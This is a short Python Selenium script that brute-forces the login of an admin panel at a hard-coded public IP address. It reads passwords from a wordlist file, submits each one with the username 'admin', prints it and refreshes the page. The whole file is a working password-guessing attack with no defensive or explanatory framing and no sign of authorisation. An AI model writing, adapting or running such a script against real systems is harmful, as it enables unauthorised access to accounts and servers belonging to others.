from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time

url = 'http://101.201.146.8:80/admin/index.php'
driver = webdriver.Chrome()
driver.get(url)

f = open(r'password.txt')
for i in f.readlines():
    input_account = driver.find_element_by_id('username')
    input_account.send_keys('admin')
    input_password = driver.find_element_by_id('password')
    i = i.strip('\n')
    input_password.send_keys(i)
    login_button = driver.find_element_by_name('login_sub')
    login_button.click()
    print(i)
    time.sleep(0.2)
    #if(driver.find_element_by_class_name('u-mask')):
    driver.refresh()
